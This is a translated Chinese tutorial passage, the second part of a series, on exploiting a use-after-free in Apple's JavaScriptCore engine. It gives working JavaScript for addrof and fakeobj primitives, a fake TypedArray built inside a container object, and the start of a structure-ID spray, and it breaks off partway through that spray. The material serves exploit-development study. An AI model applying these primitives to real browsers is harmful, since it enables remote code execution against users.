原文：
在本文的上篇中，我们为读者介绍了漏洞利用原语的概念，并讲解了渐进式原语构建的理念，同时，还详细介绍了UAF目标的选取、强行构造UAF漏洞的方法以及如何利用该漏洞构建相对读写原语的方法。在本文中，我们将为读者介绍如何一步一步实现远程代码执行。
**相对R/W原语的局限性**
* * *
不幸的是，JSArrays固有的几个因素限制了我们在上一节中建立的相对R/W原语的效用。其中，最主要的限制是JSArray的length属性是作为32位有符号整数来存储和使用的。
这的确是一个问题，因为这意味着，我们只能以“向前”索引的方式来越界读写紧随我们的butterfly结构的堆数据。这样的话，对于我们的相对R/W原语来说，无法访问运行时内存空间中的很大一部分。
    // relative access limited 0-0x7FFFFFFF forward from malformed array
    print(oob_array[-1]);             // bad index (undefined)
    print(oob_array[0]);              // okay
    print(oob_array[10000000]);       // okay
    print(oob_array[0x7FFFFFFF]);     // okay
    print(oob_array[0xFFFFFFFF]);     // bad index (undefined)
    print(oob_array[0xFFFFFFFFFFF]);  // bad index (undefined)
我们的下一个目标，是构建一个任意R/W原语，以便可以读写应用程序运行时的64位地址空间中的任意内存。对于JavaScriptCore来说，可以实现这种周遍性的技术有多种，具体将在下一节中讨论。
**TypedArrays的应用**
* * *
在JavaScript语言规范中，有一些称为[TypedArrays](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays
"TypedArrays")的对象。实际上，这是些类似于数组的对象，允许JS开发人员通过较低级别的数据类型对内存进行更精确和有效的控制。
之所以将TypedArrays引入JavaScript语言，就是为了便于编写在浏览器中处理音频、视频和图像的脚本。这是因为，使用直接内存操作或存储来实现这些类型的计算会更自然、更高效。出于同样的原因，漏洞利用作者通常对TypedArrays也是虎视眈眈。
TypedArray的结构（在JavaScriptCore的上下文中）包含以下组件：
一个JSCell，类似于所有其他JSObjects
  * 未用的Butterfly指针字段
  * 指向TypedArray数据的底层“后备存储”的指针
  * 后备存储的长度
  * 模式标志
重要的是，后备存储是存储在TypedArray对象中的用户数据在内存中的实际位置。如果我们可以覆盖TypedArray的后备存储指针，则可以指向内存中的任何地址。
内存中TypedArray JSObject的示意图及其底层后备存储
实现任意R/W原语最简单的方法，是在畸形的JSArray之后的某处分配一个TypedArray对象，然后，使用我们的相对R/W原语将后备存储指针改为我们选择的地址。通过对索引为0的TypedArray元素进行读写操作，我们就能直接与指定地址的内存单元进行交互了。
可以通过覆盖TypedArray中的后备存储指针来实现任意R/W原语
由于没有时间去研究JSC堆和垃圾收集器算法，所以，我们很难通过纯堆风水方法将TypedArray放到我们的相对R/W范围的附近。相反，我们将采用[已知](http://phrack.org/papers/attacking_javascript_engines.html
"已知")的漏洞利用技术来创建“伪造的”TypedArray，并实现相同的效果。
**通用漏洞利用原语**
* * *
虽然伪造TypedArray要比撞大运式的堆分配更加复杂，但它的优点是，在实践中将更加可靠（和具有确定性）。为了能够顺利伪造所需的JS对象，首先需要使用相对R/W原语来构建的两个更高级别的“通用”漏洞利用原语：
  * addrof(...)，可以用来获取任意javascript对象的内存地址
  * fakeobj(...)，可以根据提供的内存地址返回该位置的javascript对象。
为了创建addrof(...)原语，首先需要创建一个普通的JSArray(oob_target)，它的butterfly位于我们破坏的JSArray
butterfly（相对R/W原语）之后。
利用JavaScript，我们可以将任意对象放入数组的第一个索引对应的内存空间中[A]，然后使用相对R/W原语oob_array读取存储在附近的数组（oob_target）中的对象指针的地址（作为浮点数）。
以[IEEE 754](https://babbage.cs.qc.cuny.edu/IEEE-754.old/Decimal.html "IEEE
754")格式解码浮点数，这样就能得到JSObject在内存中的地址[B]：
    // Get the address of a given JSObject
    prims.addrof = function(x) {
        oob_target[0] = x; // [A]
        return Int64.fromDouble(oob_array[oob_target_index]); // [B]
    }
通过对上述过程进行逆向操作，就可以得到
fakeobj(...)原语了。为此，可以通过相对R/W原语（oob_array）将给定地址（作为浮点数）写入oob_target数组的butterfly结构[C]。使用JavaScript读取该数组索引将返回我们存储的指针的JSObject
[D]：
    // Return a JSObject at a given address
    prims.fakeobj = function(addr) {
        oob_array[oob_target_index] = addr.asDouble(); // [C]
        return oob_target[0]; // [D]
    }
使用相对R/W原语，我们创建了一些更高级别的通用漏洞原语，这些原语能够帮助我们创建伪造的JavaScript对象。这简直就像为JavaScript引擎扩展了新的特性！
接下来，我们将演示如何使用这两个新原语来帮助构建伪造的TypedArray对象，进而实现真正的任意R/W原语。
**任意R/W原语**
* * *
这里创建伪造的TypedArray的方法，来自本文前面phrack文章。为了全面起见，我们将对该方法进行详细介绍。
为了便于创建伪造的TypedArray，我们将在一个标准的JSObject“内部”构建它。我们创建的“容器”对象如下所示：
    let utarget = new Uint8Array(0x10000);
    utarget[0] = 0x41;
    // Our fake array
    // Structure id guess is 0x200
    // [ Indexing type = 0 ][ m_type = 0x27 (float array) ][ m_flags = 0x18 (OverridesGetOwnPropertySlot) ][ m_cellState = 1 (NewWhite)]
    let jscell = new Int64('0x0118270000000200');
    // Construct the object
    // Each attribute will set 8 bytes of the fake object inline
    obj = {
        // JSCell
        'a': jscell.asDouble(),
        // Butterfly can be anything (unused)
        'b': false,
        // Target we want to write to (the 'backing store' field)
        'c': utarget,
        // Length and flags
        'd': new Int64('0x0001000000000010').asDouble()
    };
以这种方式使用JSObject，我们就可以轻松随意地设置或修改任何对象内容了。例如，我们可以轻松地让“后备存储”（我们的任意R/W原语）指向任何JS对象，为此，只需将它放到伪造的“BackingStore”字段中即可。
在这些元素中，JSCell是最难伪造的。具体来说，JSCell的structureID字段是问题所在。在运行时，JSC为每个JavaScript对象类生成一个唯一的结构ID。该引擎会使用此ID来确定对象类型，以及如何处理它及其所有属性。然而，在运行时，我们并不知道TypedArray的结构ID是什么。
为了解决这个问题，我们需要借助一些方法，来可靠地“猜出”所需对象类型的有效结构ID。实际上，由于JavaScriptCore的某些低层机制的缘故，如果我们创建一个TypedArray对象并至少为其添加一个自定义属性的话，JavaScriptCore就会为其分配一个唯一的结构ID。因此，我们可以利用这一点来“喷射”结构ID，从而可靠地猜出与TypedArray相对应的id（例如，0x200）。
    // Here we will spray structure IDs for Float64Arrays
    // See http://www.phrack.org/papers/attacking_javascript_engines.html
    function sprayStructures() {
      function randomString() {
          return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
      }
      // Spray arrays for structure id